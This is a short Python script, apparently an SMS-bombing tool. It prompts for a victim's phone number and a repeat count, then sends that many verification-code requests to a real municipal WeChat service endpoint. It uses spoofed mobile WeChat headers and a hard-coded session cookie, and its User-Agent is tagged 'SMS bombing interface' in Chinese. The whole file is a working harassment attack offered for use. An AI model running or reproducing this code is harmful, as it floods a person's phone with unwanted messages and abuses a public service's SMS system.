import requests




def get_verity_code(phone, times):
    url = "http://ycweixin.jxyc12345.cn:18081/yc12345/weixin/me/getVerityCode/" + phone
    headers = {
        "Host": "ycweixin.jxyc12345.cn:18081",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-cn",
        "Content-Type": "application/json",
        "Origin": "http://ycweixin.jxyc12345.cn:18081",
        "Content-Length": "0",
        "Connection": "keep-alive",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.TG 短信轰炸接口.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
        "Referer": "http://ycweixin.jxyc12345.cn:18081/yc12345/weixin/me/bind",
        "Cookie": "jeeplus.session.id=59f6a2b7b6404009843380f4a3b098f2"
    }
    for i in range(times):
        response = requests.post(url, headers=headers)
        print(f"第{i + 1}次请求结果：{response.text}")


if __name__ == "__main__":
    phone = input("请输入手机号：")
    times = int(input("请输入运行次数："))
    get_verity_code(phone, times)
